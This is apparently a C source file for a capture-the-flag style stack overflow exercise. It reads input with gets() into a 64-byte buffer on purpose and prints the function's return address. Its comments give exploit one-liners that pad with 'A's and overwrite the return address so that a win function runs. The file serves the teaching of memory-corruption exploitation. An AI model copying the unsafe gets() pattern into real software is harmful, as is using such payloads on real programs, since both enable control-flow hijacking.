#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html
//A value of 0 yields the return address of the current function, 
//a value of 1 yields the return address of the caller of the current function, and so forth.
//current function return address -->//0x401196
// python -c "print 'A'*64 + '\x96\x11\x40'" | ./stackthree
// ./stackthree <<< $(python -c "print 'A'*64 + '\x96\x11\x40'")

// python -c "print 'A'*88 + '\x96\x11\x40'" | ./stackfour
char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished  :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", "BANNER");
  start_level();
}